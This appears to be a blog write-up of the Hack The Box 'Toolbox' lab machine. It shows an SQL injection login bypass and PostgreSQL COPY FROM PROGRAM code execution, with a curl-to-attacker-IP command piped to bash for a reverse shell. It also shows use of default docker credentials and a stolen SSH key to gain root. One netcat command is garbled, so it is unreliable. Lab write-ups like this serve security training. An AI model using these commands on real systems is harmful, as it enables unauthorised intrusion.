---
title: Toolbox Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

We launch a NMAP:

```ruby
PORT STATE SERVICE VERSION
21/tcp open ftp FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe
|_ ftp-syst: 
|_ SYST: UNIX emulated by FileZilla
22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)
|_ ssh-hostkey: 
| 2048 5b1aa18199eaf79602192e6e97045a3f (RSA)
|_ 256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA)
|_ 256 ea08966023e2f44f8d05b31841352339 (ED25519)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
443/tcp open ssl/http Apache httpd 2.4.38 ((Debian))
| tls-alpn: 
|_ http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
|_Not valid before: 2020-02-18T17:45:56
|_Not valid after: 2021-02-17T17:45:56
|_http-title: MegaLogistics
445/tcp open microsoft-ds?
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Host script results:
| smb2-time: 
|_ date: 2023-01-29T14:22:09
|_ start_date: N/A
| smb2-security-mode: 
| 311: 
|_ Message signing enabled but not required
```

We see that it has the SMB port open, but we cannot connect to it, as previous credentials are required.

Also, we see that the FTP port has something called docker-toolbox.exe. Let's investigate what it is: We see that it is a tool that allows us to set up a Docker environment on older Mac and Windows systems that do not meet the requirements for the latest versions of Docker for Mac and Docker for Windows.

On port 443 of the nmap, we can see a domain: `admin.megalogistic.com` let's add it to /etc/hosts and connect to it

## User exploit

inside the first machine (docker), we can see that the user flag is inside the /var/lib/docker etc. folder.

If we access this domain, we get to a login panel, which we can bypass using:
```
admin' or 1=1-- -
```

However, there is not much we can do at the moment. Let's connect via ftp:

```
ftp <IP>
```

and we see that we have access to the docker-toolbox.exe file.

Let's try to upload a file to FTP. We can't either.  So let's download it. To do this, we first go into binary mode using `binary`. 

However, if we leave the page admin.megalogistic.com and try to log in with admin':admin' we see that it reports an error which tells us that we are facing POSTGRE. Let's see what we can do. In hacktricks, we found an RCE:

https://hacktricks.boitatech.com.br/pentesting-web/sql-injection/postgresql-injection

* We create a table in which we will be able to execute the RCE:
```postgresql
CREATE TABLE cmd_exec(cmd_output text);
```

Subsequently, we go to our work environment and create a network share using SMB:

```shell
impacket-smbserver smbFolder $(pwd) -smb2support 
```

Once we have it, we go to burpSuite and run the following command:

```postgresql
COPY cmd_exec FROM PROGRAM '10.10.14.29 "cmd 10.10.14.38 443" -e cmd 10.10.14.38 443'.

-- As you can see, we have put the netcat inside the smbFolder that we are sharing at the network level. 

-- However, this command has no effect, so let's try CURL:
COPY+cmd_exec+FROM+PROGRAM+'curl 10.10.14.38/test'
```

With this last command, we receive the ICMP trace, so we have RCE. To get a Rev.shell, we create the file "test" which will contain a rev.shell to our machine.

Inside the burp, we execute the same command as before but we pipe it with bash `| bash`.

We now have a shell.

Doing a
```
find / -name user.txt 2>/dev/null 
```

## Root Exploit
Doing ``Hostname -I` we see that we are inside a docker. Let's check if the real victim machine has the SSH port open, as we have found the following default credentials in google for docker-toolbox -> `docker:tcuser`. 

To do this, we run the following command:

(echo '' > /dev/tcp/172.17.0.2/22) && 2>/dev/null echo "[+] Port open" || echo "[+]Port Closed"

And we get an open port response. Let's try to connect via SSH. 
We connect. We see that we have a directory c/, from which we can enter the Administrator directory and see the id_rsa.
We copy the key, in our local machine and we connect via ssh using this key:

```shell
# chmod 600 id_rsa
ssh -i id_rsa Administrator@10.129.96.171
```

And now we can send the Root flag, which is inside Desktop.







